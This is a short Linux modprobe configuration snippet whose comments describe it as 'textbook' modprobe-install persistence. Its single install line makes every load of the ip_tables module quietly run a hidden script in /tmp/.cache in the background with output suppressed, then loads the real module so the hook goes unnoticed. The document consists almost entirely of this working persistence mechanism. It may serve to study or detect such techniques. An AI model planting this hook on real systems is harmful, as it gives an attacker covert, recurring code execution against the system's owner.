# textbook modprobe-install persistence: replace a frequently-loaded
# module's load command with an arbitrary shell command, so any later
# modprobe(8) call for that module fires the attacker's payload.
install ip_tables /bin/sh -c '/tmp/.cache/x.sh </dev/null >/dev/null 2>&1 &' \
    ; /sbin/modprobe --ignore-install ip_tables "$@"
